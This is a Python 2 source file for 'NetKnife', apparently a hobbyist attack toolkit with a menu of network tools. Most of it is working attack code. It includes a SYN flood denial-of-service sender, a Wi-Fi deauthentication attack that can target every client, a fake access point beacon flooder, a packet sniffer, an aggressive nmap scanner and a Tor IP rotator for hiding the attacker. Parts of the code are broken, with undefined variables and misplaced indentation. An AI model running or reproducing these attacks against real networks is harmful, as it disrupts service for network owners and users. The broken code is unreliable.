import os
from colorama import Fore
import sys
import time
from scapy.all import *
import hashlib
import nmap
import socket

os.system("clear")
print Fore.RED + ("""
'|.   '|'           .   '||'  |'            ||    .'|.            
 |'|   |    ....  .||.   || .'    .. ...   ...  .||.     ....     
 | '|. |  .|...||  ||    ||'|.     ||  ||   ||   ||    .|...||  
 |   |||  ||       ||    ||  ||    ||  ||   ||   ||    ||       
.|.   '|   '|...'  '|.' .||.  ||. .||. ||. .||. .||.    '|...' 
""")
def printer(Print):
    for c in Print + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(5. / 100)

printer ("\033[91m[+]Welcome To NetKnife Framework")
printer ("[+]Please Wait")

printer ("Developer: AmirHosein Tangsiri Nezhad")
printer ("GitHub: https://github.com/AmirHoseinTnagsiriNET/NetKnife")

time.sleep(3)
printer ("[+]Chose Tools Number ")
printer ("[1]:Arp Cache Poisiner Tools(Coming Soon)")
printer ("[2]:Fake Access Point Creator Tools")
printer ("[3]:SSID Hidden Locator Tools")
printer ("[4]:Hash Creator Tools")
printer ("[5]:SYN Flooder Tools")
printer ("[6]:Network Packet Capture Tools")
printer ("[7]:AP And WIFI Device Detection Tools")
printer ("[8]:Public IP Changer In 3 Per Second(Linux System-D Only)")
printer ("[9]:Wi-Fi Deauthentication Attacker Tools")
printer ("[10]Tcp Port Scanner Tools")
printer ("[99]: Exit The NetKnife")

#[1]:Arp Cache Poisiner Tools
#This tool is used to implement the Arp Cache Poisoning attack on the target

def Arp():
    print "Coming Soon"


#[2]:Fake Access Point Creator Tools
#This tool is used to create fake access points

def FakeAP():

    print """
    .########.##....##....###....########.
    .##.......##...##....##.##...##.....##
    .##.......##..##....##...##..##.....##
    .######...#####....##.....##.########.
    .##.......##..##...#########.##.......
    .##.......##...##..##.....##.##.......
    .##.......##....##.##.....##.##.......
    """
    iface = raw_input("Plese Enter The Interface (WireLess Net Adapter On Monitor Mode): ")
    sender_mac = RandMAC()
    ssid = raw_input("Plese Enter The SSID(Name Of AP):" )
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    print Fore.RED + "Created AP"
    print "AP Name: " + ssid
    print "interfaces: " + iface

    sendp(frame, inter=0.1, iface=iface, loop=1)


#[3]:SSID Hidden Locator Tools
#This tool is responsible for finding Wireless and Access Point devices that are hidden

def SSIDHeddin():
    
	print """
	 ######          ##        #######   ######     ###    ########  #######  ########  
	##    ##         ##       ##     ## ##    ##   ## ##      ##    ##     ## ##     ## 
	##               ##       ##     ## ##        ##   ##     ##    ##     ## ##     ## 
	 ######  ####### ##       ##     ## ##       ##     ##    ##    ##     ## ########  
	      ##         ##       ##     ## ##       #########    ##    ##     ## ##   ##   
	##    ##         ##       ##     ## ##    ## ##     ##    ##    ##     ## ##    ##  
	 ######          ########  #######   ######  ##     ##    ##     #######  ##     ## 

"""

iface = raw_input("Plese Enter The Network Adapter: ")

SSID_Hiiden = set()
def SSID(packet):
	if packet.haslayer(Dot11Beacon):
        	if not packet.info:
            		if packet.addr3 not in SSID_Hiiden:
                		print "Discovered Hidden Network "
                		print "-------------------------"
        	        	print "Network BSSID: " + addr3
	elif packet.haslayer(Dot11ProbeRes) and (packet.addr3 in SSID_Hiiden):
		print "Network SSID: " + packet.info, packet.addr3


	sniff(iface=iface , count=1000, prn=SSID)




#[4]:Hash Creator Tools
#This tool is used to convert Plain-Text texts to Cipher-Text texts using Hash algorithms.

def HashGen():

    print """
    '||'  '||'                '||       ..|'''.|                                     .     .                   
     ||    ||   ....    ....   || ..   .|'     '    ....  .. ...   ... ..    ....  .||.  .||.    ...   ... ..  
     ||''''||  '' .||  ||. '   ||' ||  ||    .... .|...||  ||  ||   ||' '' .|...||  ||    ||   .|  '|.  ||' '' 
     ||    ||  .|' ||  . '|..  ||  ||  '|.    ||  ||       ||  ||   ||     ||       ||    ||   ||   ||  ||     
    .||.  .||. '|..'|' |'..|' .||. ||.  ''|...'|   '|...' .||. ||. .||.     '|...'  '|.'  '|.'  '|..|' .||. 
    """

    print Fore.GREEN + """
    [+] Hash Genrettor Tools [+]
    	*** Hash Algorithm Support List ***
    		md5:      [+]-1
    		sha1:     [+]-2
    		sha224:   [+]-3 
    		sha256:   [+]-4 
    		sha512:   [+]-5
    """
    text = raw_input("[*] pleaese enter the your hash: ")
    hashmodel = raw_input("[*] plese entee the mod hash: ")
    if hashmodel == "1":
    	md5 = hashlib.md5()
    	md5.update(inputer)
    	print "[*] md5 hash genereted: ",md5.hexdigest()
    if hashmodel == "2":
    	sha1 = hashlib.sha1()
    	sha1.update(text)
    	print Fore.WHITE + "[*] sha1 hash genereted: ",sha1.hexdigest()
    if hashmodel == "3":
    	sha224 = hashlib.sha224()
    	sha224.update(text)
    	print Fore.YELLOW + "sha224 hash genereted: ",sha224.hexdigest()
    if hashmodel =="4":
    	sha256 = hashlib.sha256()
    	sha256.update(text)
    	print Fore.RED + "[*] sha256 hash genereted: ",sha256.hexdigest()
    if hashmodel =="5":
        sha512 = hashlib.sha512()
    	sha512.update(text)
        print Fore.WHITE + "[*] sha512 hash genereted: ",sha512.hexdigest() 


#[5]:SYN Flooder Tools
#This tool is used to implement the Syn Flooding attack, which is a Denial-Of-Service attack

def Syn():
	print """
	 #####               #######                                           
	#     # #   # #    # #       #       ####   ####  #####  ###### #####  
	#        # #  ##   # #       #      #    # #    # #    # #      #    # 
	 #####    #   # #  # #####   #      #    # #    # #    # #####  #    # 
      #   #   #  # # #       #      #    # #    # #    # #      #####  
	#     #   #   #   ## #       #      #    # #    # #    # #      #   #  
	 #####    #   #    # #       ######  ####   ####  #####  ###### #    # 
	"""

        print "This The Syn Flooding Tools With IP Changer"
        TargetIP = raw_input("Plese Enter The Target IP or Domain: ")
        print Fore.RED + "Field Values of packet send"

        p=IP(dst=TargetIP,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
        ls(p)
        print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
        ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
        print "Summary of answered & unanswered packets"
        ans.summary()
        unans.summary()
        print "source port flags in response"
        ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))



#[6]:Network Packet Capture Tools
#This tool is used to record ongoing traffic from the interface

def NetSniffer():


    print """
    .##....##.########.########..######..##....##.####.########.########.########.########.
    .###...##.##..........##....##....##.###...##..##..##.......##.......##.......##.....##
    .####..##.##..........##....##.......####..##..##..##.......##.......##.......##.....##
    .##.##.##.######......##.....######..##.##.##..##..######...######...######...########.
    .##..####.##..........##..........##.##..####..##..##.......##.......##.......##...##..
    .##...###.##..........##....##....##.##...###..##..##.......##.......##.......##....##.
    .##....##.########....##.....######..##....##.####.##.......##.......########.##.....##
    """
    iface = raw_input("Plese Enter The Interface For Sniffing: ")
    def PacketSniifer(packet):
       print packet.summary()
       return

    sniff(iface=iface, count="100", prn=PacketSniifer)



#[7]:AP And WIFI Device Detection Tools
#This tool is used to detect the Mac and SSID addresses of AP and Wireless devices

def APD():
    

    print """
         /.\      '||'''|, '||'''|.          ||                   ||                         
        // \\      ||   ||  ||   ||          ||                   ||     ''                  
       //...\\     ||...|'  ||   || .|''|, ''||''  .|''|, .|'', ''||''   ||  .|''|, `||''|,  
      //     \\    ||       ||   || ||..||   ||    ||..|| ||      ||     ||  ||  ||  ||  ||  
    .//       \\. .||      .||...|' `|...    `|..' `|...  `|..'   `|..' .||. `|..|' .||  ||.         
    """

    iface = raw_input("Plese Enter The Network Adapter: ")
    ssid = set()
    def SSIDLocator(packet):
        if packet.haslayer(Dot11Beacon):
            if (packet.info not in ssid) and packet.info:
               print len(ssid),"Mac Addrss:",packet.addr3,"SSID:",packet.info
    sniff(iface=iface,count=100,prn=SSIDLocator)






#[8]:Public IP Changer In 3 Per Second
#This tool changes the general IP address of your system once every 3 seconds using the Tor service. 
#Note: This tool is missing on Linux systems along with System-D

def IP_Changer():

    print """
    The Python Script For Change Public IP Address Your System 
    
    """
    while True:
    	time.sleep(3)
        print Fore.GREEN + "Changed IP"
        os.system("sudo systemctl reload tor")




def Deauthentication():


    print """
    .########..########....###....##.....##.########.##.....##.########.##....##.########.####..######.....###....########.####..#######..##....##
    .##.....##.##.........##.##...##.....##....##....##.....##.##.......###...##....##.....##..##....##...##.##......##.....##..##.....##.###...##
    .##.....##.##........##...##..##.....##....##....##.....##.##.......####..##....##.....##..##........##...##.....##.....##..##.....##.####..##
    .##.....##.######...##.....##.##.....##....##....#########.######...##.##.##....##.....##..##.......##.....##....##.....##..##.....##.##.##.##
    .##.....##.##.......#########.##.....##....##....##.....##.##.......##..####....##.....##..##.......#########....##.....##..##.....##.##..####
    .##.....##.##.......##.....##.##.....##....##....##.....##.##.......##...###....##.....##..##....##.##.....##....##.....##..##.....##.##...###
    .########..########.##.....##..#######.....##....##.....##.########.##....##....##....####..######..##.....##....##....####..#######..##....##
    """
    iface = raw_input("Plese Enter The Network Adapter: ")
    TargetMac = raw_input("Plese Enter The Target Mac Address(for All Target Enter the Brotcast Mac Addess): ")

    Gateway = raw_input("Plese Enter The Gateway Mac Address: ")

    dot11_packet = Dot11(addr1=TargetMac,addr2=Gateway,addr3=Gateway)
    Deauth = RadioTap()/dot11_packet/Dot11Deauth(reason=7)
    print "Started Deauthentication Attack on:" + TargetMac
    sendp(Deauth, inter=1.0, count=200, iface=iface, verbose=1)


	
	
#[10]Tcp Port Scanner Tools
#This tool is used to scan Tcp protocol ports. This tool, unlike similar tools in other frameworks, has a higher scanning power

def TCPPortScanner():
	print """
#######                #####                                            
   #     ####  #####  #     #  ####    ##   #    # #    # ###### #####  
   #    #    # #    # #       #    #  #  #  ##   # ##   # #      #    # 
   #    #      #    #  #####  #      #    # # #  # # #  # #####  #    # 
   #    #      #####        # #      ###### #  # # #  # # #      #####  
   #    #    # #      #     # #    # #    # #   ## #   ## #      #   #  
   #     ####  #       #####   ####  #    # #    # #    # ###### #    # 

    """


	scanner = nmap.PortScanner()

	target = raw_input("Plese Enter The IP Or Domin Target: ")
	portrange = raw_input("Plese Enter The Port Range(For Example 22-443): ")

	scanResult = scanner.scan(target, portrange , arguments='-T4 -sV')

	for host in scanner.all_hosts():
		print("Host Address: %s (%s)" % (host, scanner[host].hostname()))
    		for proto in scanner[host].all_protocols():
        		print("Protocol Type: %s" % proto)
 
	Port_Number = scanner[host][proto].keys()
	Port_Number.sort()
	for port in Port_Number:
		print ("Port: %s\tstate : %s" % (port, scanner[host][proto][port]['state']))
		print "Aggressive Result:\n %s" % scanResult


	
	
	


TN = input ("[+]Please Enter the Tools Number: ")
if TN == 1:
	Arp()
    #print "Coming Soon"
	#os.system("python Arp.py")
if TN == 2:
	FakeAP()
    #os.system("python FKAP.py")
if TN == 3:
	SSIDHeddin()
    #print "Coming Soon"
	#os.system("python SSID.py")
if TN == 4:
	HashGen()
    #os.system("python Hash.py")
if TN == 5:
	Syn()
    #os.system("python Syn.py")
if TN == 6:
	NetSniffer()
    #os.system("python NetSniffer.py")
if TN == 7:
	os.system("python APD.py")
if TN == 8:
	IP_Changer()
    #os.system("python IP-Changer.py")
if TN == 9:
	Deauthentication()
    #os.system("python Deauthentication.py")
if TN == 10:
	TCPPortScanner()
if TN == 99:
	printer ("Exited The NetKnife")
	sys.exit()
#else:
#	print ("[!]Not Found Tools Number")
